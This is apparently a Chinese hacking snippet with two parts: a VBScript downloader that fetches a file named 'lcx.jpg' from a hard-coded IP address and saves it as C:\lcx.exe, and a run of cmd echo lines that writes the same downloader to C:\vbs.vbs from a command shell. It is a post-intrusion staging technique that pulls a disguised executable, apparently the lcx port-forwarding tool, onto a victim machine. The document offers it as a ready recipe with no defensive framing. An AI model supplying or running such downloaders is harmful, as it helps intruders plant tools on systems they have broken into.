
下载文件
Set xPost = createObject("Microsoft.XMLHTTP")
xPost.Open "GET"," http://210.30.128.10/UserFiles/lcx.jpg",0
xPost.Send()
Set sGet = createObject("ADODB.Stream")
sGet.Mode = 3
sGet.Type = 1
sGet.Open()
sGet.Write(xPost.responseBody)
sGet.SaveToFile "C:\lcx.exe",2



CMD命令写下载文件的VBS
echo Set xPost = createObject("Microsoft.XMLHTTP") >> C:\vbs.vbs
echo xPost.Open "GET"," http://210.30.128.10/UserFiles/lcx.jpg",0 >> C:\vbs.vbs
echo xPost.Send() >> C:\vbs.vbs
echo Set sGet = createObject("ADODB.Stream") >> C:\vbs.vbs
echo sGet.Mode = 3 >> C:\vbs.vbs
echo sGet.Type = 1 >> C:\vbs.vbs
echo sGet.Open() >> C:\vbs.vbs
echo sGet.Write(xPost.responseBody) >> C:\vbs.vbs
echo sGet.Write(xPost.responseBody) >> C:\vbs.vbs
echo sGet.SaveToFile "C:\\lcx.exe",2 >> C:\vbs.vbs
